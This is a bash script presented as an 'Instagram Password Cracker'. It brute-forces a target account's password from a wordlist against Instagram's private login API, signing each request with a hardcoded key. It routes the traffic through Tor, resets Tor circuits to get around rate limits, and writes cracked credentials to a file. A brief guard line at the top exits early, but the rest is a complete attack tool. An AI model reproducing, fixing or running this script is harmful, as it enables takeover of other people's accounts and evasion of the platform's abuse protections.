#!/bin/bash

# SAFETY GUARD — live execution is disabled by default to prevent misuse.
# To test the repository use the provided safe simulation: `make run-safe` or `./simulate.sh`.
printf "\e[1;93m[!] Live execution disabled by default — run `make run-safe` to simulate.\e[0m\n" >&2
exit 1

trap 'store;exit 1' 2
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
# fetch headers (keep best-effort; header may be empty during static analysis)
var=$(curl -i -s -H "$header" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid" || true)
var2=$(echo "$var" | awk -F ';' '{print $2}' | cut -d '=' -f3)

checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77m 🛡️ Please, run this program as root!\n\e[0m"
    exit 1
fi
}

dependencies() {

command -v openssl > /dev/null 2>&1 || { echo >&2 "❌ I require openssl but it's not installed. Aborting."; exit 1; }
command -v tor > /dev/null 2>&1 || { echo >&2 "❌ I require tor but it's not installed. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "❌ I require curl but it's not installed. Aborting."; exit 1; }
command -v awk > /dev/null 2>&1 || { echo >&2 "❌ I require awk but it's not installed. Aborting."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "❌ I require cat but it's not installed. Aborting."; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "❌ I require tr but it's not installed. Aborting."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "❌ I require wc but it's not installed. Aborting."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "❌ I require cut but it's not installed. Aborting."; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "❌ I require uniq but it's not installed. Aborting."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "❌ I require sed but it's not installed. Aborting."; exit 1; }
if [ ! -r /dev/urandom ]; then
    echo "/dev/urandom not found!"
    exit 1
fi

}

banner() {

printf "\e[1;38;5;196m  _____           _           _____            _                \e[0m\n"
printf "\e[1;38;5;196m |_   _|         | |         / ____|          | |               \e[0m\n"
printf "\e[1;38;5;196m   | |  _ __  ___| |_ __ _  | |    _   _ _ __ | |__   ___ _ __  \e[0m\n"
printf "\e[1;38;5;40m   | | |  _ \/ __| __/ _  | | |   | | | |  _ \|  _ \ / _ \  __| \e[0m\n"
printf "\e[1;38;5;40m  _| |_| | | \__ \ || (_| | | |___| |_| | |_) | | | |  __/ |    \e[0m\n"
printf "\e[1;38;5;196m |_____|_| |_|___/\__\__ _|  \_____\__  |  __/|_| |_|\___|_|    \e[0m\n"
printf "\e[1;38;5;196m                                    __/ | |                     \e[0m\n"
printf "\e[1;38;5;196m                                   |___/|_|                     \e[0m\n"
printf "\n"
printf "\e[1;77m\e[45m   Instagram Password Cracker - By Pralin Khaira   \e[0m\n"
printf "\n"
}

cat <<EOF
This Script is Designed And Developed
By Pralin Khaira 
Under - GNU General Public License v3.0 (GPL-3.0)
Which Means - That if someone uses or modifies this code, 
They must also release the derivative work under the same terms, 
Making it subject to copyright and the same licensing terms.
EOF

function start() {
banner
checkroot
dependencies
read -r -p $'\e[1;92m 📝 Enter The Username For The Account: \e[0m' user
checkaccount=$(curl -s "https://www.instagram.com/${user}/?__a=1" | grep -c "The User May Have Been Banned Or Page Being Deleted/Non-Exsistance/No User (With this username)")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91m ❌ Invalid Username Entered! Try Again\e[0m\n"
sleep 1
start
else
default_wl_pass="default-passwords.lst"
read -r -p $'\e[1;92m 📃 Enter The name Of Custom Password List (Press Enter For Deafult List): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="15"
read -r -p $'\e[1;92m 🔗 Threads To Use While Testing Passwords: (Always Use < 20, Default-15): \e[0m' threads
threads="${threads:-${default_threads}}"
fi
}

checktor() {

check=$(curl --socks5 localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;91m 🧅 Please, check your TOR Connection! Just type tor or service tor start\n\e[0m"
exit 1
fi

}

function store() {

if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
if [[ "$threads" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
default_session="Y"
printf "\n\e[1;77m 📲 Save session for user \e[0m\e[1;92m %s \e[0m" "$user"
read -r -p $'\e[1;77m? ❓ [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
  if [[ ! -d sessions ]]; then
    mkdir -p sessions
  fi
  ts=$(date +"%FT%H%M")
  printf 'user="%s"\npass="%s"\nwl_pass="%s"\n' "$user" "$pass" "$wl_pass" > "sessions/store.session.$user.$ts"
  printf "\e[1;77m ✔️ Session saved.\e[0m\n"
  printf "\e[1;92m Use ./instashell --resume\n"

else
exit 1
fi
else
exit 1
fi
}


function changeip() {

killall -HUP tor
#sleep 3

}

function bruteforcer() {

checktor
count_pass=$(wc -l < "$wl_pass")
printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" "$user"
printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" "$wl_pass" "$count_pass"
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"

startline=1
endline="$threads"
while true; do
IFS=$'\n' 
while IFS= read -r pass; do
header="Connection: \"close\", \"Accept\": \"*/*\", \"Content-type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie2\": \"\$Version=1\" \"Accept-Language\": \"en-US\", \"User-Agent\": \"Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)\""

data=$(printf '{"phone_id":"%s", "_csrftoken":"%s", "username":"%s", "guid":"%s", "device_id":"%s", "password":"%s", "login_attempt_count":"0"}' "$phone" "$var2" "$user" "$guid" "$device" "$pass")
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"

countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" "$countpass" "$count_pass" "$pass"

{(trap '' SIGINT && var=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
(( startline += threads ))
(( endline += threads ))
changeip
done
}



function resume() {

banner 
checktor
counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] No sessions\n\e[0m"
exit 1
fi
printf "\e[1;92mFiles sessions:\n\e[0m"
shopt -s nullglob
for list in sessions/store.session*; do
  IFS=$'\n'
  [ -f "$list" ] || continue
# shellcheck disable=SC1090
source "$list"
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$pass"
  ((counter++))
done
shopt -u nullglob
read -r -p $'\e[1;92mChoose a session number: \e[0m' fileresume
shopt -s nullglob
sessions_arr=(sessions/store.session*)
shopt -u nullglob
selected="${sessions_arr[$((fileresume-1))]:-}"
if [ -z "$selected" ]; then
  printf "Invalid session selection\n"
  exit 1
fi
# shellcheck disable=SC1090
source "$selected"
default_threads="10"
read -r -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" "$user"
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" "$wl_pass"
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
count_pass=$(wc -l < "$wl_pass")
startline="$threads"
while true; do
IFS=$'\n'
# determine resume start-line (find last occurrence of saved 'pass')
start_from=$(grep -nF -- "$pass" "$wl_pass" | tail -n1 | cut -d: -f1 || true)
if [ -z "$start_from" ]; then
  start_from=1
else
  start_from=$(( start_from + 1 ))
fi
endline=$(( start_from + threads - 1 ))
while IFS= read -r pass; do
header="Connection: \"close\", \"Accept\": \"*/*\", \"Content-type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie2\": \"\$Version=1\" \"Accept-Language\": \"en-US\", \"User-Agent\": \"Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)\""

data=$(printf '{"phone_id":"%s", "_csrftoken":"%s", "username":"%s", "guid":"%s", "device_id":"%s", "password":"%s", "login_attempt_count":"0"}' "$phone" "$var2" "$user" "$guid" "$device" "$pass")
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"

countpass=$(grep -nF -- "$pass" "$wl_pass" | cut -d":" -f1 | head -n1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)'

printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" "$countpass" "$count_pass" "$pass"

{(trap '' SIGINT && var=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
(( startline += threads ))
changeip
done
}

case "$1" in --resume) resume ;; *)
start
bruteforcer
esac
